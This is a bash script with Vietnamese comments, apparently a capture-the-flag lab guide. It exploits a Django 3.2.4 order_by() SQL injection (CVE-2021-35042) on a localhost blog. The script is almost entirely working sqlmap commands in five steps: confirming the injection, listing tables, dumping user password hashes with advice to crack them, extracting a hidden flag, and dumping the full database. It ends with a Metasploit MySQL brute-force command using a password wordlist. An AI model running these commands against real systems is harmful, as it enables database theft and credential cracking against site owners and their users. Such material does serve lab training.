#!/usr/bin/env bash
# ============================================================
# CVE-2021-35042 — sqlmap Exploitation Guide
# Target: Django 3.2.4 — QuerySet.order_by() SQL Injection
#
# Điểm injection:
#   GET /posts/?sort=blog_post.id+<PAYLOAD>
#
# Cơ chế: Django 3.2.4 truyền thẳng sort param vào ORDER BY
# mà không sanitize. Khi tên field có dấu ".", ORM chuyển
# sang nhánh RawSQL — không có whitelist, không có escape.
#
# Kỹ thuật: Error-based qua extractvalue() / GTID_SUBSET
# ============================================================

TARGET="http://localhost:8000/posts/"

# ── BƯỚC 1: Xác nhận lỗ hổng + lấy thông tin database ──────
# --banner        : lấy version MySQL
# --current-db    : tên database đang dùng
# --current-user  : user MySQL đang chạy
# --technique=E   : chỉ dùng Error-based (nhanh, không cần blind)
# --no-cast       : tránh sqlmap thêm CAST() làm hỏng payload
# --batch         : tự động chọn default cho mọi câu hỏi
echo "=== STEP 1: Xác nhận SQLi + lấy thông tin DB ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --level=1 --risk=1 \
  --banner --current-db --current-user \
  --batch

# ── BƯỚC 2: Liệt kê tất cả bảng trong database ctf_blog ─────
# -D ctf_blog     : chỉ định database mục tiêu
# --tables        : liệt kê tên các bảng
echo "=== STEP 2: Liệt kê bảng trong ctf_blog ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog --tables

# ── BƯỚC 3: Dump bảng blog_user — lấy hash password admin ───
# -T blog_user    : bảng chứa thông tin user Django
# -C ...          : chỉ lấy các cột cần thiết (nhanh hơn dump all)
# Sau khi dump: crack MD5 hash bằng hashcat hoặc CrackStation
echo "=== STEP 3: Dump bảng blog_user (lấy hash password) ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog -T blog_user \
  -C username,password,email,is_staff \
  --dump

# ── BƯỚC 4: Dump cột secret_flag từ bảng blog_post ──────────
# Bảng blog_post chứa bài viết PRIVATE với FLAG bị ẩn
# status='private' → không hiển thị ngoài web → phải dùng SQLi
# Mục tiêu: tìm cột secret_flag có giá trị HTB{...}
echo "=== STEP 4: Dump secret_flag từ bài viết private ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog -T blog_post \
  -C id,title,secret_flag,status \
  --dump

# ── BƯỚC 5: Dump toàn bộ database ra file ───────────────────
# --dump-all      : dump tất cả bảng không phải system table
# --output-dir    : thư mục lưu kết quả (CSV format)
echo "=== STEP 5: Full dump toàn bộ database ==="
sqlmap -u "${TARGET}?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --suffix="" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog --dump-all \
  --output-dir=/tmp/sqlmap_ctf_dump

# ── BƯỚC 6: Chuyển sang Metasploit (MySQL brute force) ──────
# Sau khi dump database qua SQLi, bước tiếp theo là
# khai thác trực tiếp MySQL port 3306 bằng Metasploit.
#
# Metasploit yêu cầu: MySQL phải expose port ra ngoài.
# docker-compose.yml đã map port 3306:3306 → dùng được.
#
# Chạy metasploit_guide.sh để xem hướng dẫn chi tiết:
#   bash metasploit_guide.sh
#
# Hoặc chạy nhanh module brute force:
#   msfconsole -q -x "
#     use auxiliary/scanner/mysql/mysql_login;
#     set RHOSTS 127.0.0.1;
#     set RPORT 3306;
#     set USERNAME pentestuser;
#     set PASS_FILE /usr/share/wordlists/rockyou.txt;
#     run
#   "
echo ""
echo "=== HOÀN TẤT SQLi PHASE ==="
echo "Kết quả dump tại: /tmp/sqlmap_ctf_dump/"
echo "Bước tiếp theo  : bash metasploit_guide.sh"
echo ""
echo "FLAG nằm trong bảng blog_post, cột secret_flag, bản ghi status=private"
